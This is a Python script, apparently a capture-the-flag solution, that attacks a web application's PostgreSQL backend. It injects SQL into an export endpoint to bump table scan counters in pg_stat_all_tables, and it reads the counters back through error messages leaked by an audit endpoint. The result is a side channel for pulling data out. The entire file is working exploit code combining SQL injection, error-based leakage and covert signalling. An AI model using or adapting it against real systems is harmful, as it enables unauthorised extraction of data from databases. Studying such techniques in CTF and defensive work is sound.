"""빠른 export 부채널: 여러 카운터에 동시에 싣고, 이전 값 재사용, 짧은 재확인."""
import sys, time, json
sys.path.insert(0, '/Users/junguk/ctf/panda')
from probe import api, s, B

# 카운터 이름 -> (읽는 SQL 조각, 한 번 증가시키는 lateral 서브쿼리)
STAT = {
    'cap_seq': "(select seq_scan from pg_stat_all_tables where relid='archive_stage.export_capsule'::regclass)",
    'man_seq': "(select seq_scan from pg_stat_all_tables where relid='archive_stage.worker_manifest'::regclass)",
    'man_idx': "(select coalesce(idx_scan,0) from pg_stat_all_tables where relid='archive_stage.worker_manifest'::regclass)",
    'grv_seq': "(select seq_scan from pg_stat_all_tables where relid='app.bamboo_groves'::regclass)",
    'grv_idx': "(select coalesce(idx_scan,0) from pg_stat_all_tables where relid='app.bamboo_groves'::regclass)",
}
BUMP = {
    'cap_seq': "select 1 from archive_stage.export_capsule t where g.g>0 limit 1",
    'man_seq': "select 1 from archive_stage.worker_manifest t where g.g>0 limit 1",
    'man_idx': "select 1 from archive_stage.worker_manifest t where t.manifest_key='chunk_size' and g.g>0",
    'grv_seq': "select 1 from app.v_export_groves t where g.g>0 limit 1",
    'grv_idx': "select 1 from app.v_export_groves t where t.grove_id='8ddb18cf-f845-593b-81f2-57abaa5474cd' and g.g>0",
}
LOG = '/Users/junguk/ctf/panda/out/xfast.log'


def log(*a):
    line = ' '.join(str(x) for x in a)
    print(line, flush=True)
    with open(LOG, 'a') as f:
        f.write(line + '\n')


def read_all(names):
    q = "'x'||concat_ws(',',%s)" % ','.join(STAT[n] for n in names)
    _, t = api('/api/audit', f"({q})", query='harvest')
    e = json.loads(t).get('engine_error', '')
    return [int(v) for v in e.split('"x', 1)[1].rstrip('"').split(',')]


class Chan:
    def __init__(self, names, offsets=None):
        self.names = names
        self.offsets = offsets or {n: 0 for n in names}
        self.last = read_all(names)

    def expr(self, vals):
        parts = [f"(select count(*) from generate_series(1,{v}) g, lateral ({BUMP[n]}) x)"
                 for n, v in zip(self.names, vals)]
        return '+'.join(parts)

    def send(self, vals, timeout=6):
        api('/api/export', self.expr(vals))
        t0 = time.time()
        while time.time() - t0 < timeout:
            cur = read_all(self.names)
            d = [c - l for c, l in zip(cur, self.last)]
            if all(x > 0 or self.offsets[n] == 0 and False for x, n in zip(d, self.names)) or \
               all(x - self.offsets[n] >= 0 for x, n in zip(d, self.names)) and any(x != 0 for x in d):
                # 모든 카운터가 반영됐는지: 다음 읽기에서 변화 없으면 확정
                time.sleep(0.15)
                cur2 = read_all(self.names)
                if cur2 == cur:
                    self.last = cur
                    return [x - self.offsets[n] for x, n in zip(d, self.names)]
            time.sleep(0.2)
        self.last = read_all(self.names)
        return None
